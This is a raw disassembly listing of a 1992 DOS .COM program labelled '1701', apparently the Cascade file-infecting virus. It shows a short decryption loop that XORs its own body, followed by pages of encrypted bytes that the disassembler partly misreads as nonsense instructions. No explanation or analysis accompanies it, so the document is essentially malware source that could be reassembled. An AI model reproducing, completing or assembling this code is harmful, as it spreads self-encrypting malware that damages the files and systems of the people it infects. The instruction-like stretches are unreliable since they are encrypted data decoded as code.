
PAGE  59,132

;€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€
;€€								         €€
;€€			        1701				         €€
;€€								         €€
;€€      Created:   11-Feb-92					         €€
;€€      Passes:    5	       Analysis Options on: none	         €€
;€€								         €€
;€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€

data_31e	equ	27D1h			;*
data_36e	equ	4CD6h			;*
data_39e	equ	6950h			;*
data_45e	equ	8848h			;*
data_50e	equ	0BDF1h			;*
data_53e	equ	0CBC7h			;*
data_55e	equ	0EA36h			;*
data_58e	equ	49F2h
data_59e	equ	0B0E0h
data_60e	equ	0BCF1h
data_61e	equ	0EAEFh

seg_a		segment	byte public
		assume	cs:seg_a, ds:seg_a


		org	100h

1701		proc	far

start:
		jmp	loc_2
		db	39 dup (0)
data_22		db	0			; Data table (indexed access)
		db	58 dup (0)
loc_2:
		cli				; Disable interrupts
		mov	bp,sp
		call	sub_1

1701		endp

;ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ
;			       SUBROUTINE
;‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹

sub_1		proc	near
		pop	bx
		sub	bx,131h
		test	cs:data_22[bx],1
		jz	$+11h			; Jump if zero
		lea	si,[bx+14Dh]		; Load effective addr
		mov	sp,682h
loc_4:
		xor	[si],si
		xor	[si],sp
		inc	si
		dec	sp
		jnz	loc_4			; Jump if not zero
		db	 8Eh,0EBh,0E5h,0BDh, 62h,0F6h
		db	0F7h, 06h,0EFh,0EEh,0EEh, 2Fh
		db	0C2h,0E6h,0E6h,0E2h,0B1h, 11h
		db	0EEh, 02h, 6Ch,0F8h, 36h,0EAh
		db	 3Bh,0DCh,0E0h,0C3h,0C2h,0C6h
		db	0E6h,0C2h

locloop_5:
		mov	si,dx
		push	es
		db	0F1h, 60h,0D4h,0ABh, 69h, 96h
		db	0EEh,0EEh,0E2h, 0Bh, 06h,0DBh
		db	0E2h
		db	0E2h,0EEh,0EEh,0F2h,0FAh,0F6h
		db	0F6h
loc_7:
		db	0F2h,0F2h, 7Ah, 87h, 61h
loc_9:
		test	ah,[di-80h]
		add	byte ptr [bp+si-7171h],0F6h
		jc	loc_9			; Jump if carry Set
		div	dl			; al, ah rem = ax/reg
		db	0F2h,0EEh,0EEh,0E2h,0E3h, 1Bh
		db	 16h,0C2h
		db	0C2h,0CEh
		db	0CEh, 1Ah,0F2h,0F6h,0ADh, 73h
		db	 19h, 6Dh,0CFh,0ECh, 4Eh, 49h
		db	 92h,0C3h,0ECh, 47h, 49h,0A4h
		db	0F3h,0D8h, 7Dh, 75h,0AAh,0EFh
		db	 4Dh,0E2h,0E3h,0C8h, 6Ch, 65h
		db	0B8h,0EFh, 4Ch,0F0h,0F3h,0A5h
		db	 42h,0C2h, 3Fh, 2Fh, 56h, 3Dh
		db	 03h, 77h, 14h,0B9h,0FEh, 46h
		db	 3Eh, 0Eh,0C1h, 00h, 3Bh,0D3h
		db	 73h, 11h, 44h,0B7h, 97h,0E9h
		db	 94h,0F4h
		db	 19h,0F0h,0E9h,0DCh, 79h, 71h
		db	0A0h,0F3h,0DCh, 31h, 61h, 90h
		db	0C3h, 95h, 7Eh,0E3h,0F7h, 03h
		db	0EFh, 79h, 31h,0ADh,0D8h, 7Bh
		db	 75h, 8Fh,0EFh,0CCh, 6Eh, 61h
		db	 85h,0E3h, 5Ah,0EEh, 1Eh, 7Ch
		db	 32h, 49h,0FEh, 12h, 73h,0B3h
		db	0CDh,0CDh,0F7h, 9Dh, 07h,0FFh
		db	 80h,0DEh,0DCh, 87h,0E6h, 77h
		db	 8Bh,0F6h,0DCh
loc_14:
		into				; Int 4 on overflow
		db	 9Bh,0EFh, 63h, 9Bh,0E0h,0ABh
		db	0A0h, 9Bh,0E8h, 71h, 8Fh,0FEh
		db	0BBh, 86h, 45h, 76h,0B5h,0C2h
		db	 4Eh, 0Bh, 8Bh, 4Ch, 07h,0E0h
		db	 45h,0C4h,0E4h,0F6h,0D0h, 7Bh
		db	0C4h,0EFh,0EEh,0C4h, 69h,0F0h
		db	0E5h,0E2h,0C4h, 4Dh,0EDh,0F2h
		db	0D4h, 30h,0F0h,0F2h,0F2h, 43h
		db	 25h,0D2h, 48h, 43h, 05h,0EAh
		db	 47h, 80h,0CBh,0A1h, 46h,0A6h
		db	 7Dh, 2Fh, 3Fh,0CFh,0B5h,0D1h
		db	 1Dh,0E0h,0F1h,0B5h, 6Fh, 51h
		db	 20h,0F5h, 79h, 01h
		db	4Fh
		db	 57h,0F4h, 33h, 3Dh, 66h,0C4h
loc_16:
		dec	bx
		dec	cx
		mov	dl,0C0h
		lahf				; Load ah from flags
		add	ax,7EDCh
		jns	loc_14			; Jump if not sign
		db	0F3h, 7Fh, 61h,0C4h,0E3h, 11h
		db	 42h,0C8h, 6Eh,0ECh,0D8h,0EEh
		db	0BFh, 7Ch, 33h,0D0h
		db	 7Bh,0E4h, 8Dh, 8Eh,0A4h, 44h
		db	 80h
		db	 86h, 82h,0D8h,0A8h, 02h,0FCh
		db	0F3h
loc_19:
		div	byte ptr [bp+di+377Ch]	; al,ah rem = ax/data
           lock	jmp	$-211h
sub_1		endp

		db	 6Bh, 51h,0C8h,0E3h, 51h,0EEh
		db	0F3h, 4Bh, 53h,0F0h, 0Eh, 01h
		db	 6Ah,0C8h, 4Fh,0C4h, 42h,0C4h
		db	 92h
		db	9
		db	0E0h, 09h,0F4h,0DEh,0F6h,0F6h
		db	0F2h,0DCh, 62h,0E0h,0F4h,0E2h
		db	0F8h, 6Bh,0F4h,0FEh,0EDh,0E0h
		db	0EDh, 4Ah,0D7h,0D3h, 3Fh,0D3h
		db	 11h,0BBh, 19h,0B9h, 87h, 07h
		db	0CEh, 22h,0E7h,0FCh,0F2h, 46h
		db	0DCh, 3Bh,0D3h, 73h, 17h, 2Ah
		db	0E5h, 95h, 83h, 92h,0C8h, 63h
		db	 17h, 52h,0F5h, 87h,0ABh,0E8h
		db	 4Ah,0DAh,0FBh, 03h,0E3h,0ECh
		db	 4Fh,0D8h,0F9h,0C3h,0E0h
		db	42h
		db	0F4h,0CFh,0F7h, 4Eh,0DAh,0D7h
		db	 54h,0CCh,0E5h,0ECh,0F9h, 2Bh
		db	0C3h,0FDh,0C0h, 6Eh,0FCh,0A5h
		db	0F7h,0FEh, 19h,0F4h, 1Eh, 0Eh
loc_22:
		jl	loc_19			; Jump if <
		hlt				; Halt processor
		mov	dl,6Ah			; 'j'
		dec	word ptr ds:data_55e[si]
		out	1Eh,ax			; port 1Eh ??I/O Non-standard
		jc	loc_22			; Jump if carry Set
		mov	dl,0C0h
		dec	bp
		mov	sp,0C8E3h
		inc	bp
		and	bl,0C0h
		sub	sp,si
		xchg	ax,si
		div	di			; ax,dx rem=dx:ax/reg
		db	0F2h, 4Ah,0D2h,0FBh, 0Fh,0E3h
		db	0E8h, 4Fh,0DCh,0F1h,0CFh,0E0h
		db	 7Eh,0F4h
		db	0C3h,0F7h,0ECh, 4Ah,0F2h,0CBh
		db	 58h, 5Fh,0E0h,0E8h,0FDh, 2Fh
		db	0CFh,0F1h, 49h, 24h, 09h, 1Fh
		db	 65h, 0Ch, 8Eh,0F2h, 49h, 76h
		db	 16h, 28h,0FDh, 2Ch, 39h, 0Fh
		db	 4Dh, 58h,0A3h,0D8h, 36h,0F4h
		db	0D9h,0EFh, 6Eh, 28h, 29h,0DAh
		db	 1Dh, 96h, 1Fh,0D2h,0F2h, 87h
		db	 1Eh, 6Ah,0A2h,0A1h, 9Fh, 9Ch
		db	 94h, 95h, 93h,0C0h,0DCh,0ECh
		db	 47h,0D8h,0B5h,0F3h,0D8h, 7Ah
		db	0ECh,0BBh,0EFh,0E0h,0E5h, 5Ah
		db	0E6h,0DBh, 2Fh,0C3h, 9Ch,0B8h
		db	 79h, 2Ah, 4Eh,0F6h,0A5h, 3Fh
		db	0AFh,0A0h, 0Bh, 94h,0C5h, 87h
		db	0ACh, 0Bh, 80h,0CBh,0F3h, 46h
		db	0C9h,0F8h,0EDh, 48h,0C0h,0EFh
		db	 5Bh,0E1h,0E6h, 2Bh,0C3h, 90h
		db	0D9h,0D5h, 33h, 87h,0C5h, 4Eh
		db	0F0h,0B0h,0FDh, 07h,0F1h, 10h
		db	 0Bh,0E7h,0ECh, 61h, 85h
		db	0CFh,0DCh, 7Bh,0E0h,0BBh,0F3h
		db	 46h,0D0h, 23h,0C3h,0CCh, 67h
		db	0D8h,0CCh,0E3h,0A3h,0B4h, 87h
		db	0F1h, 1Fh, 31h,0F2h,0DCh, 8Dh
		db	 37h, 48h, 04h, 01h, 76h, 0Ch
		db	 2Bh, 88h, 37h,0BEh,0F3h,0CDh
		db	 0Fh, 84h,0F1h, 07h, 5Dh,0E2h
		db	0CCh, 66h,0D8h,0CCh,0E3h, 07h
		db	 9Bh,0FCh,0DCh
		db	57h
loc_27:
		mov	bp,0F7F3h
		xchg	ax,di
		aaa				; Ascii adjust
		in	al,dx			; port 0C0h, DMA-2 bas&add ch 0
		stc				; Set carry flag
		db	0C0h,0E9h
		db	0C3h,0B6h, 29h, 76h,0F2h,0B1h
		db	0D8h, 33h,0E4h,0B5h,0EFh, 23h
		db	0C3h, 90h, 3Dh,0C8h, 6Bh,0ECh
		db	0AFh,0EFh, 72h, 03h,0D6h, 00h
		db	 33h,0D5h,0FAh, 87h, 3Ah, 83h
		db	0C5h,0B5h, 4Bh, 4Fh,0AFh
		db	0FCh, 37h, 4Ah,0F4h
		db	0CBh, 3Fh,0D3h, 9Ch, 50h, 69h
		db	 3Ah, 5Eh,0E4h,0A0h,0D1h, 27h
		db	0DDh, 20h, 3Fh,0D7h, 1Eh,0A2h
		db	0F1h,0BDh,0D6h, 7Ah,0C2h, 84h
		db	0E8h, 49h,0CCh, 83h,0CFh,0DCh
		db	 79h,0E0h,0BDh,0F3h, 3Fh,0CFh
		db	 5Ah,0A2h,0D1h, 2Fh, 2Bh,0C3h
		db	 09h,0CFh, 7Eh
		db	 4Ah,0F2h,0B4h,0C5h, 3Bh,0C1h
		db	0DCh,0C3h, 23h, 70h, 13h, 28h
		db	0A3h, 49h, 0Fh, 0Bh, 0Ch, 0Dh
		db	0D8h, 55h,0A2h,0F3h, 5Ah,0AEh
		db	 58h,0ADh,0E7h, 5Fh,0E1h,0E2h
		db	 23h,0CFh, 4Ah,0F3h,0A1h,0D8h
		db	 79h,0E4h, 8Dh,0CFh,0ECh, 49h
		db	0C8h, 83h,0C3h, 0Fh,0EFh, 7Ah
		db	0CCh, 3Fh,0D7h,0D8h, 79h,0FCh
		db	0AFh,0EFh, 14h, 23h,0E1h, 93h
		db	0E7h, 14h, 2Fh,0CEh, 87h,0F8h
		db	 4Eh,0F7h,0B1h,0DCh, 4Bh, 98h
		db	0C5h, 83h, 4Bh,0A7h, 9Dh, 85h
		db	0D3h,0D1h,0ACh,0A8h,0AFh,0ADh
		db	0AAh, 6Fh, 07h, 5Ch, 1Ch,0FCh
		db	0E8h
loc_33:
		stc				; Set carry flag
		mov	cl,0B3h
		mov	sp,4BBEh
		cmc				; Complement carry
		db	0F6h, 4Dh, 86h,0F3h, 31h,0F9h
		db	 49h, 85h, 38h,0D7h,0C5h, 89h
		db	 85h
		db	 2Ch, 05h,0AAh,0E7h,0F1h, 79h
		db	0E5h,0B6h,0E5h, 22h, 96h,0E4h
		db	 11h, 00h, 69h, 2Ch,0B4h,0ABh
		db	0A9h,0E9h, 35h,0ECh,0F4h, 58h
		db	 58h, 52h, 0Dh, 00h,0BEh, 43h
		db	 03h, 81h,0D6h, 4Ch, 94h,0F7h
		db	 48h, 9Eh,0F2h, 57h,0E6h,0E2h
		db	 1Eh, 15h, 43h,0BBh,0BDh,0B0h
		db	0E9h,0EDh, 31h,0A0h,0E8h,0A0h
		db	 78h, 08h, 38h,0E4h, 90h,0C7h
		db	 70h,0C2h,0C1h
		db	0Ch
		db	 1Fh, 12h,0F1h,0F0h,0ACh,0F3h
		db	 79h, 1Eh, 18h,0E4h,0B6h,0E7h
		db	 19h, 6Ch,0FCh,0B6h,0EFh, 86h
		db	0E0h, 4Ch, 2Ch,0F1h, 08h, 62h
		db	 26h, 8Ah,0F7h, 8Fh, 2Eh, 83h
		db	0F7h, 79h, 62h, 5Ah,0F3h, 82h
		db	 0Dh, 5Fh
		db	 09h,0B4h,0F1h,0BCh, 21h,0B1h
		db	0E0h,0B0h,0B1h, 65h, 36h, 78h
		db	 34h, 00h,0D0h,0A0h,0F3h, 78h
		db	0CEh,0C1h, 00h, 17h, 26h,0C1h
		db	0C4h, 94h,0CFh, 79h, 0Ah, 00h
		db	0F0h,0A6h,0F3h, 11h, 60h,0E4h
		db	0BAh,0E7h, 92h,0F0h, 58h, 34h
		db	0EDh, 08h, 1Eh, 5Eh,0FEh, 87h
		db	0FBh,0A6h, 0Fh, 77h,0F5h,0EAh
		db	0AEh, 03h, 76h,0F5h, 85h, 31h
		db	 58h, 0Dh,0ADh,0A8h,0F5h,0B1h
		db	 2Dh,0B3h,0B3h, 6Dh,0E8h,0BEh
		db	0E3h, 0Ch, 10h,0ABh, 10h, 00h
		db	0AFh, 31h,0A2h, 2Ah,0AFh,0F6h
		db	0C0h,0E2h, 38h, 24h,0A3h, 96h
		db	 0Dh,0CEh,0F2h, 82h,0FCh,0CEh
		db	0D2h, 9Ah,0E8h,0DEh, 1Dh, 92h
		db	0E4h, 1Ah, 21h, 17h, 2Dh,0CEh
		db	 42h, 84h,0F0h,0CEh, 2Dh,0F9h
		db	 8Ch, 7Bh, 41h, 7Eh, 45h, 9Ch
		db	 3Ah,0CEh, 8Eh, 7Ch, 2Ah, 0Dh
		db	 57h, 9Eh,0F2h,0D5h,0E8h, 8Eh
		db	0E2h, 92h, 1Ch,0D1h
loc_37:
		sub	cx,[bx-7Eh]
		db	0F2h,0B3h, 82h,0E3h,0C9h,0F4h
		db	0A2h,0CEh,0B6h, 35h,0D9h, 4Dh
		db	 03h,0F1h, 1Ch, 77h,0FDh,0F2h
		db	 01h, 07h,0DCh, 51h,0B2h,0EFh
		db	 21h,0ABh
		db	 0Dh, 08h
		db	 24h,0E4h
		db	0BDh,0EFh,0EAh,0ECh, 4Eh,0B6h
		db	0F2h, 7Ch,0D6h,0ACh, 4Fh, 01h
		db	 1Ah,0A6h, 5Bh, 00h,0BFh,0F2h
		db	 49h,0C2h,0E7h, 41h,0F2h,0F4h
		db	0BBh, 23h,0F2h,0BFh,0E1h, 66h
		db	 18h, 1Dh, 9Ah,0EAh, 7Ah,0E4h
		db	0A5h,0F7h, 46h,0FDh, 03h,0DEh
		db	 4Ah,0E4h, 94h,0C7h, 04h,0C4h
		db	 9Ah,0CFh,0F2h, 35h,0F0h,0AEh
		db	0F3h,0F2h, 5Eh,0D2h,0E5h, 96h
		db	0D0h, 94h
		db	0E1h, 0Bh, 0Eh,0EEh, 35h,0F4h
		db	0AEh,0F7h,0F2h, 4Ah,0B2h, 8Dh
		db	0F5h

locloop_40:
		movsw				; Mov [si] to es:[di]
;*		mov	dx,offset loc_46	;*
		db	0BAh, 84h,0F0h
		mov	ax,ds:data_45e
		cmpsb				; Cmp [si] to es:[di]
		db	0F3h,0F7h, 56h,0A1h,0F3h, 10h
		db	 2Eh, 14h,0C4h,0B4h,0E7h, 41h
		db	 80h,0EFh, 4Fh, 96h,0F3h,0CDh
		db	0F0h, 90h,0F3h,0B8h,0CDh, 63h
		db	0A0h,0C7h, 2Eh,0A9h, 3Ch, 8Eh
		db	 45h, 02h,0C1h, 09h,0B1h, 53h
		db	 90h,0EFh, 3Fh, 02h,0D9h, 1Eh
		db	 90h,0E1h, 0Bh, 4Eh,0EEh, 72h
		db	0FCh,0A1h,0F7h,0F0h, 52h, 5Ch
		db	 0Fh,0B6h, 02h,0EEh, 4Ah,0FCh
		db	 88h,0DEh,0AEh,0A1h,0F3h, 42h
		db	0F6h, 1Ah,0B0h, 10h, 64h, 12h
		db	 0Ah, 60h, 18h, 0Ah,0F3h, 11h
		db	 9Ch, 20h, 1Ah,0EAh, 09h, 80h
		db	 3Fh, 6Ch, 9Bh,0C3h, 4Ah,0E0h
		db	 90h,0C3h, 48h,0C0h, 9Dh,0F3h
		db	 47h,0F6h, 08h, 34h,0C8h,0D8h
		db	0BDh,0E3h, 95h,0B4h, 0Eh, 86h
		db	 1Ch,0D4h,0C8h,0A4h,0F3h, 83h
		db	0BFh, 1Ah, 1Bh, 70h,0FCh,0AAh
		db	 6Ah, 72h, 78h,0F0h,0BDh, 70h
		db	 48h,0C8h,0C4h,0A5h,0F7h, 85h
		db	0C5h, 06h,0A7h, 1Ch,0D8h,0C0h
		db	0B0h,0E3h, 97h,0C0h, 06h, 3Ch
		db	 0Ch, 85h, 13h, 1Ah, 4Ch, 30h
		db	 30h, 0Ch, 2Ah,0F0h, 38h, 60h
		db	 97h,0CFh, 30h, 34h, 72h,0D0h
		db	0A1h,0F3h, 0Fh, 10h, 20h, 52h
		db	0C2h, 0Eh,0BBh, 1Ch, 1Ch, 28h
		db	 4Eh,0A7h,0F3h, 1Eh,0A3h, 0Ch
		db	 11h, 0Ah,0E7h, 8Dh,0FDh, 4Eh
		db	0ECh,0A5h,0F5h, 09h, 58h,0F2h
		db	0F0h, 82h,0F5h, 1Bh,0AEh, 11h
		db	 06h, 69h, 1Ch,0A8h, 92h,0E1h
		db	 0Bh,0BFh, 11h, 16h, 93h,0D2h
		db	 0Ah, 14h, 93h, 0Dh,0E0h, 34h
		db	0C4h, 91h,0C7h,0CBh,0B7h, 96h
		db	0E0h, 72h,0FCh,0A1h,0F7h,0F3h
		db	0DCh, 11h,0E0h,0BCh,0E3h, 93h
		db	0A3h,0FCh

locloop_41:
		in	al,0E0h			; port 0E0h, Memory encode reg2
		db	0F1h,0FCh,0F5h,0A6h,0A5h,0A3h
		db	0A0h,0D8h,0D9h,0D7h, 32h,0A6h
		db	 60h,0A2h, 23h,0EEh, 8Fh,0CFh
		db	0CAh,0F2h, 85h,0F1h, 4Ah,0D6h
		db	0EAh, 0Ah, 9Ch, 1Bh,0A6h, 41h
		db	0BCh,0EFh, 4Dh, 92h,0F3h, 1Eh
		db	 61h, 0Ch, 4Ah,0CDh,0CEh, 2Ah
		db	0ACh, 3Bh, 86h, 35h,0E4h,0AAh
		db	0CFh, 81h,0F1h, 4Eh, 09h, 0Dh
		db	 51h, 8Ah,0EFh,0BFh,0BDh,0B8h
		db	0BCh,0BBh,0B9h,0B6h,0E9h,0EDh
		db	0DCh, 76h,0D0h,0A5h,0F3h,0F0h
		db	 20h,0FDh, 2Ch, 35h, 07h, 2Ch
		db	0F4h, 08h, 59h,0F3h,0FAh, 82h
		db	0EBh,0A2h,0A3h,0BCh, 5Ah,0C8h
		db	 2Fh,0C7h, 67h, 1Bh, 26h,0E9h
		db	 9Ch,0FFh, 85h,0F3h

locloop_42:
		jbe	loc_45			; Jump if below or =
		clc				; Clear carry flag
		mov	sp,0ECC8h
		inc	dx
		loopnz	locloop_41		; Loop if zf=0, cx>0

		retn
		db	 35h, 94h
		db	97h
		db	0AAh
loc_45:
		esc	4,[bx+di]		; coprocessor escape
		esc	0,cl			; coprocessor escape
		db	0F3h,0E8h,0BDh, 56h,0AAh, 5Dh
		db	 8Dh,0E2h, 2Fh,0CFh,0B5h, 81h
		db	0F1h, 0Fh,0F1h, 31h,0DCh, 48h
		db	 88h, 82h, 83h, 87h, 08h, 42h
		db	 8Ch, 91h,0BDh, 0Dh, 4Ch,0F6h
		db	0F7h, 4Bh, 57h,0E8h, 12h, 11h
		db	 46h, 59h,0C5h,0E2h, 5Ch,0CDh
		db	0EFh,0F1h,0C4h,0BDh,0F7h, 4Bh
		db	 70h,0C8h,0E8h,0F3h,0F7h,0E0h
		db	0F7h,0CFh, 85h, 88h, 2Ch, 04h
		db	 7Ch, 2Eh, 42h,0B2h,0C1h, 3Ch
		db	 57h, 47h,0E4h, 2Bh,0C7h, 7Eh
		db	0B2h, 5Ah,0A7h, 3Fh,0D3h,0AEh
		db	 6Bh,0FCh,0EDh, 7Ch,0BBh, 36h
		db	0CCh, 7Ch,0BFh, 0Ah,0F5h,0C2h

seg_a		ends



		end	start
